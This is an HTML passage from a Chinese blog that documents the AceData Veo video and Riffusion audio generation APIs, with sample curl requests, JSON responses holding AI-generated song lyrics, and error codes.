                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"1ebe4f2b-59ba-4385-a4ea-0ce8a3fe12ed"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"d1d53c04-58c5-4c40-bb63-f00188540e56"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"2f43ceed37944b4d836e1a1899dad0a1"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="string">"https://platform.cdn.acedata.cloud/veo/1ebe4f2b-59ba-4385-a4ea-0ce8a3fe12ed.mp4"</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-07-25 17:19:20"</span>,</span><br><span class="line">      <span class="attr">"complete_at"</span>: <span class="string">"2025-07-25 17:21:45"</span>,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>可以看到结果中有一个 <code>task_id</code> 字段，其他的字段都和上文类似，通过该字段即可实现任务的关联。</p>
                  <h2 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h2>
                  <p>在调用 API 时，如果遇到错误，API 会返回相应的错误代码和信息。例如：</p>
                  <ul>
                    <li><code>400 token_mismatched</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>400 api_not_implemented</code>：Bad request, possibly due to missing or invalid parameters.</li>
                    <li><code>401 invalid_token</code>：Unauthorized, invalid or missing authorization token.</li>
                    <li><code>429 too_many_requests</code>：Too many requests, you have exceeded the rate limit.</li>
                    <li><code>500 api_error</code>：Internal server error, something went wrong on the server.</li>
                  </ul>
                  <h3 id="错误响应示例"><a href="#错误响应示例" class="headerlink" title="错误响应示例"></a>错误响应示例</h3>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">"error"</span>: &#123;</span><br><span class="line">    <span class="attr">"code"</span>: <span class="string">"api_error"</span>,</span><br><span class="line">    <span class="attr">"message"</span>: <span class="string">"fetch failed"</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"2cf86e86-22a4-46e1-ac2f-032c0f2a4e89"</span></span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2>
                  <p>通过本文档，您已经了解了如何使用 Veo Videos Generation API 可通过输入提示词以及首帧参考图片来生成视频。希望本文档能帮助您更好地对接和使用该 API。如有任何问题，请随时联系我们的技术支持团队。</p>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2025-08-05 20:01:22" itemprop="dateCreated datePublished" datetime="2025-08-05T20:01:22+08:00">2025-08-05</time>
                </span>
                <span id="/42373.html" class="post-meta-item leancloud_visitors" data-flag-title="Veo Videos Generation API 对接说明" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>5.7k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>5 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/42372.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> API <i class="label-arrow"></i>
                  </a>
                  <a href="/42372.html" class="post-title-link" itemprop="url">Riffusion Audios Generation API 对接说明</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <h2 id="申请流程"><a href="#申请流程" class="headerlink" title="申请流程"></a>申请流程</h2>
                  <p>要使用 API，需要先到 <a href="https://platform.acedata.cloud/documents/riffusion-audios" target="_blank" rel="noopener">Riffusion Audios Generation API</a> 对应页面申请对应的服务，进入页面之后，点击「Acquire」按钮，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/q6ytrc.png" alt=""></p>
                  <p>如果你尚未登录或注册，会自动跳转到登录页面邀请您来注册和登录，登录注册之后会自动返回当前页面。</p>
                  <p>在首次申请时会有免费额度赠送，可以免费使用该 API。</p>
                  <h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2>
                  <p>想些什么歌曲，可以任意输入一段文字，比如我想生成一个关于圣诞的歌曲，就可以输入 <code>a song for Christmas</code>，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/4i4ysn.png" width="600" class="m-auto"></p>
                  <p>可以看到这里我们设置了 Request Headers，包括：</p>
                  <ul>
                    <li><code>accept</code>：想要接收怎样格式的响应结果，这里填写为 <code>application/json</code>，即 JSON 格式。</li>
                    <li><code>authorization</code>：调用 API 的密钥，申请之后可以直接下拉选择。</li>
                  </ul>
                  <p>另外 Request Body 的参数包括：</p>
                  <ul>
                    <li><code>action</code>：此次音乐生成任务的行为，生成歌曲是 <code>generate</code>。</li>
                    <li><code>model</code>：创建歌曲采用的模型，目前主要有：<strong>FUZZ-1.0</strong>、<strong>FUZZ-1.1</strong>、<strong>FUZZ-1.0 Pro</strong>、<strong>FUZZ-1.1 Pro</strong>。</li>
                    <li><code>lyric</code>：歌曲的歌词内容。</li>
                    <li><code>custom</code>：是否采用自定义方式生成歌曲。</li>
                    <li><code>prompt</code>：灵感模式下的提示词。</li>
                    <li><code>style</code>：歌曲风格参数。</li>
                    <li><code>title</code>：歌曲标题信息。</li>
                    <li><code>callback_url</code>：需要回调结果的 URL。</li>
                    <li><code>instrumental</code>：是否为无歌词模式。</li>
                  </ul>
                  <p>如上参数和官方的自定义生成的映射关系如下：</p>
                  <ul>
                    <li><code>model</code>：对应 Riffusion 账号设置页面的模型选择，如下图所示</li>
                    <li><code>lyric</code>：对应 Rifussion 自定义生成页面的「Lyrics」部分，如下图所示</li>
                    <li><code>style</code>：对应 Rifussion 自定义生成页面的「Sound」部分，实际上是指定一些风格，如下图所示</li>
                    <li><code>title</code>：对应 Rifussion 自定义生成页面的「Details」部分，用于指定歌曲标题，如下图所示</li>
                    <li><code>instrumental</code>：对应 Rifussion 自定义生成页面的「Instrumental」开关，用于设置无歌词模式，如下图所示</li>
                  </ul>
                  <p><img src="https://cdn.acedata.cloud/i68847.png" width="500" class="m-auto"></p>
                  <p><img src="https://cdn.acedata.cloud/eda26o.png" width="500" class="m-auto"></p>
                  <p>选择之后，可以发现右侧也生成了对应代码，如图所示：</p>
                  <p><img src="https://cdn.acedata.cloud/0217zy.png" width="500" class="m-auto"></p>
                  <p>点击「Try」按钮即可进行测试，如上图所示，这里我们就得到了如下结果：</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">"task_id"</span>: <span class="string">"f45388a9-4169-41d4-aec8-fb8259c48d36"</span>,</span><br><span class="line">  <span class="attr">"trace_id"</span>: <span class="string">"1df9f664-fd74-476b-8038-b0b5f62ddf87"</span>,</span><br><span class="line">  <span class="attr">"data"</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"02702b40-272d-4838-8644-675105930658"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Vibe"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/e850008a-d9a1-4c8f-acbd-a37f228946bc/image/02702b40-272d-4838-8644-675105930658.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Intro]\nYeah, yeah\nKeep talking, keep talking\nI love the way you sound\n[Verse 1]\nYour voice is like a drug I can't put down\nEvery word you say just pulls me in\nI'm addicted to the way you laugh out loud\nAnd how you whisper when the room goes dim\nTell me 'bout your day, tell me 'bout your fears\nI could listen to you talk for years\n[Pre-Chorus]\nDon't stop now, don't you dare\nI need your voice filling up the air\n[Chorus]\nKeep talking, keep talking to me\nYour words are all I fucking need\nKeep talking, keep talking, I'm high\nOff every sound you make tonight\nKeep talking\n[Verse 2]\nYou could read the phone book, I don't care\nJust the rhythm of your breathing's enough\nWhen you say my name, it's like a prayer\nAnd your silence hits me twice as rough\nEvery conversation feels like home\nNever want to hear this dial tone\n[Pre-Chorus]\nDon't stop now, don't you dare\nI need your voice filling up the air\n[Chorus]\nKeep talking, keep talking to me\nYour words are all I fucking need\nKeep talking, keep talking, I'm high\nOff every sound you make tonight\nKeep talking\n[Bridge]\nWhen the world gets loud and crazy\nYour voice cuts through the noise\nYou're my favorite conversation\nYou're my drug of choice\nKeep talking, keep talking\nKeep talking, keep talking\nKeep talking, keep talking\nKeep talking, keep talking\n[Chorus]\nKeep talking, keep talking to me\nYour words are all I fucking need\nKeep talking, keep talking, I'm high\nOff every sound you make tonight\nKeep talking\n[Outro]\nYeah, yeah\nKeep talking, keep talking\nNever stop that sound"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/e850008a-d9a1-4c8f-acbd-a37f228946bc/audio/02702b40-272d-4838-8644-675105930658.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-18T15:47:54.705246Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">      <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">        <span class="attr">"words"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"[Intro]"</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;,</span><br><span class="line">          ...</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"sound"</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">179.84</span>,</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">180.48</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">63</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"Pop, upbeat tempo, modern production"</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">181.12</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"id"</span>: <span class="string">"be3fe757-621e-4017-9056-20aa7f01919e"</span>,</span><br><span class="line">      <span class="attr">"title"</span>: <span class="string">"Revive"</span>,</span><br><span class="line">      <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/e850008a-d9a1-4c8f-acbd-a37f228946bc/image/be3fe757-621e-4017-9056-20aa7f01919e.jpg"</span>,</span><br><span class="line">      <span class="attr">"lyric"</span>: <span class="string">"[Verse 1]\nI'm walking through the motions, moving day by day\nColors seem a little faded, nothing much to say\nFriends keep calling, asking if I'm doing fine\nBut I just smile and tell them everything's divine\n[Pre-Chorus]\nSomething's missing, can't quite name it\nFeels like I'm just going through the stages\n[Chorus]\nI'm barely breathing, barely feeling\nLike I'm floating through a life that isn't mine\nBarely breathing, barely healing\nSearching for a reason, searching for a sign\nTo feel alive again\nTo feel alive again\n[Verse 2]\nMorning coffee tastes like water, sunrise looks like rain\nEveryone around me laughs but I can't feel the same\nUsed to dance in silly moments, used to sing out loud\nNow I'm standing in the silence of a faceless crowd\n[Pre-Chorus]\nSomething's shifting, can't ignore it\nMaybe it's time to break these patterns\n[Chorus]\nI'm barely breathing, barely feeling\nLike I'm floating through a life that isn't mine\nBarely breathing, barely healing\nSearching for a reason, searching for a sign\nTo feel alive again\nTo feel alive again\n[Bridge]\nBut there's a beating in my chest\nA whisper saying \"don't give up yet\"\nMaybe tomorrow I'll remember\nHow to laugh and how to let\nMy heart wake up from this long sleep\nFind the fire I used to keep\n[Chorus]\nI'm barely breathing, barely feeling\nLike I'm floating through a life that isn't mine\nBarely breathing, barely healing\nSearching for a reason, searching for a sign\nTo feel alive again\nTo feel alive again\n[Outro]\nI'm gonna feel alive again\nI'm gonna feel alive again"</span>,</span><br><span class="line">      <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/e850008a-d9a1-4c8f-acbd-a37f228946bc/audio/be3fe757-621e-4017-9056-20aa7f01919e.m4a"</span>,</span><br><span class="line">      <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">      <span class="attr">"created_at"</span>: <span class="string">"2025-06-18T15:48:01.139081Z"</span>,</span><br><span class="line">      <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">      <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">        <span class="attr">"words"</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"[Verse"</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;,</span><br><span class="line">          ...</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">"text"</span>: <span class="string">"again"</span>,</span><br><span class="line">            <span class="attr">"start"</span>: <span class="number">202.88</span>,</span><br><span class="line">            <span class="attr">"end"</span>: <span class="number">211.84</span>,</span><br><span class="line">            <span class="attr">"line_index"</span>: <span class="number">54</span>,</span><br><span class="line">            <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">"state"</span>: <span class="string">"succeeded"</span>,</span><br><span class="line">      <span class="attr">"style"</span>: <span class="string">"Pop, upbeat tempo, clean production, emotional vocals"</span>,</span><br><span class="line">      <span class="attr">"duration"</span>: <span class="number">211.84</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>返回结果一共有多个字段，介绍如下：</p>
                  <ul>
                    <li><code>success</code>，此时音乐生成任务的状态情况。<ul>
                        <li><code>data</code>，此次音乐任务的结果 - <code>id</code>，此时音乐生成任务的 ID。<ul>
                            <li><code>prompt</code>，此时音乐生成任务的提示词。</li>
                            <li><code>audio_url</code>，此时音乐生成任务的音频链接。</li>
                            <li><code>image_url</code>，此时音乐生成任务的封面链接。</li>
                            <li><code>state</code>，此时音乐生成任务的状态。</li>
                            <li><code>duration</code>，此时音乐的时长信息。</li>
                            <li><code>style</code>，此时音乐的风格信息。</li>
                            <li><code>model</code>，此时音乐生成任务采用的模型信息。</li>
                            <li><code>lyric</code>，此时音乐生成任务的歌词信息。</li>
                          </ul>
                        </li>
                      </ul>
                    </li>
                  </ul>
                  <p>可以看到我们得到了想生成的音乐信息，我们只需要根据结果中 <code>data</code> 的音乐链接地址获取生成的 Riffusion 音乐即可。</p>
                  <p>另外如果想生成对应的对接代码，可以直接复制生成，例如 CURL 的代码如下：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "FUZZ-1.0",</span><br><span class="line">  "action": "generate",</span><br><span class="line">  "prompt": "A song for Christmas"</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <h2 id="自定义生成"><a href="#自定义生成" class="headerlink" title="自定义生成"></a>自定义生成</h2>
                  <p>如果想自定义生成歌词，可以输入歌词：</p>
                  <p>这时候 <code>lyric</code> 字段可以传入类似如下内容：</p>
                  <figure class="highlight applescript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">[Verse]Woke up <span class="keyword">with</span> <span class="keyword">the</span> sun <span class="keyword">in</span> <span class="keyword">my</span> eyesNo clouds <span class="keyword">above</span> just blue <span class="keyword">in</span> <span class="keyword">the</span> skiesShoes <span class="keyword">on</span> <span class="keyword">my</span> feet I’m ready <span class="keyword">to</span> runEvery step feels like a loaded gun[Chorus]Happy days are rolling inLet <span class="keyword">the</span> joy <span class="keyword">beneath</span> <span class="keyword">my</span> skinNo more shadows no more liesJust <span class="keyword">the</span> truth <span class="keyword">that</span> lifts <span class="keyword">me</span> high[Verse <span class="number">2</span>]Dancing <span class="keyword">through</span> <span class="keyword">the</span> city streetsA rhythm pounding <span class="keyword">in</span> <span class="keyword">my</span> heartbeatStrangers smile <span class="keyword">it</span>’s catching onThis world’s a stage we’re all a song[Chorus]Happy days are rolling inLet <span class="keyword">the</span> joy <span class="keyword">beneath</span> <span class="keyword">my</span> skinNo more shadows no more liesJust <span class="keyword">the</span> truth <span class="keyword">that</span> lifts <span class="keyword">me</span> high[Bridge]Throw your worries out <span class="keyword">the</span> doorLet them sink <span class="keyword">to</span> <span class="keyword">the</span> ocean floorWe’re alive <span class="keyword">and</span> <span class="keyword">it</span>’s enoughLife <span class="keyword">is</span> messy <span class="keyword">but</span> <span class="keyword">it</span>’s love[Chorus]Happy days are rolling inLet <span class="keyword">the</span> joy <span class="keyword">beneath</span> <span class="keyword">my</span> skinNo more shadows no more liesJust <span class="keyword">the</span> truth <span class="keyword">that</span> lifts <span class="keyword">me</span> high</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>接下来我们要根据歌词、标题、风格自定义生成歌曲，就可以指定如下内容：</p>
                  <ul>
                    <li>lyric：歌词文本</li>
                    <li>custom：填写为 <code>true</code>，代表自定义生成，该参数默认为 false，代表使用 <code>prompt</code> 生成。</li>
                    <li>title：歌曲的标题。</li>
                    <li>style：歌曲的风格，选填。</li>
                  </ul>
                  <p>填写样例如下：</p>
                  <p><img src="https://cdn.acedata.cloud/ny4n7m.png" width="500" class="m-auto"></p>
                  <p>填写完毕之后自动生成了代码如下：</p>
                  <p><img src="https://cdn.acedata.cloud/hm9gtn.png" width="500" class="m-auto"></p>
                  <p>对应的代码：</p>
                  <figure class="highlight shell">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">curl -X POST 'https://api.acedata.cloud/riffusion/audios' \</span><br><span class="line">-H 'accept: application/json' \</span><br><span class="line">-H 'authorization: Bearer &#123;token&#125;' \</span><br><span class="line">-H 'content-type: application/json' \</span><br><span class="line">-d '&#123;</span><br><span class="line">  "model": "FUZZ-1.0",</span><br><span class="line">  "action": "generate",</span><br><span class="line">  "lyric": "[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high",</span><br><span class="line">  "custom": true</span><br><span class="line">&#125;'</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>测试允许，生成的效果是类似的。</p>
                  <figure class="highlight json">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"success"</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">"task_id"</span>: <span class="string">"978c2912-6a90-4048-b4c1-43f9cf18c28d"</span>,</span><br><span class="line">    <span class="attr">"trace_id"</span>: <span class="string">"08dfbb99-43ce-4f65-8fd1-74b98f2b121a"</span>,</span><br><span class="line">    <span class="attr">"data"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="attr">"id"</span>: <span class="string">"eac9ab69-e210-490b-9f8d-095a6f074f40"</span>,</span><br><span class="line">            <span class="attr">"title"</span>: <span class="string">"VibeRise"</span>,</span><br><span class="line">            <span class="attr">"image_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3f3e1354-52ad-4f5b-902c-5f83abd17def/image/eac9ab69-e210-490b-9f8d-095a6f074f40.jpg"</span>,</span><br><span class="line">            <span class="attr">"lyric"</span>: <span class="string">"[Verse]\nWoke up with the sun in my eyes\nNo clouds above just blue in the skies\nShoes on my feet I’m ready to run\nEvery step feels like a loaded gun\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Verse 2]\nDancing through the city streets\nA rhythm pounding in my heartbeat\nStrangers smile it’s catching on\nThis world’s a stage we’re all a song\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high\n[Bridge]\nThrow your worries out the door\nLet them sink to the ocean floor\nWe’re alive and it’s enough\nLife is messy but it’s love\n[Chorus]\nHappy days are rolling in\nLet the joy beneath my skin\nNo more shadows no more lies\nJust the truth that lifts me high"</span>,</span><br><span class="line">            <span class="attr">"audio_url"</span>: <span class="string">"https://storage.googleapis.com/corpusant-app-public/riffs/3f3e1354-52ad-4f5b-902c-5f83abd17def/audio/eac9ab69-e210-490b-9f8d-095a6f074f40.m4a"</span>,</span><br><span class="line">            <span class="attr">"video_url"</span>: <span class="literal">null</span>,</span><br><span class="line">            <span class="attr">"created_at"</span>: <span class="string">"2025-06-23T01:57:33.438644Z"</span>,</span><br><span class="line">            <span class="attr">"model"</span>: <span class="string">"FUZZ-1.0"</span>,</span><br><span class="line">            <span class="attr">"lyrics_timestamped"</span>: &#123;</span><br><span class="line">                <span class="attr">"words"</span>: [</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span class="number">0</span>,</span><br><span class="line">                        <span class="attr">"start"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"text"</span>: <span class="string">"[Verse]"</span>,</span><br><span class="line">                        <span class="attr">"wav2vec2_format"</span>: <span class="literal">null</span></span><br><span class="line">                    &#125;,</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="attr">"end"</span>: <span class="number">0.64</span>,</span><br><span class="line">                        <span class="attr">"index_range"</span>: <span class="literal">null</span>,</span><br><span class="line">                        <span class="attr">"line_index"</span>: <span 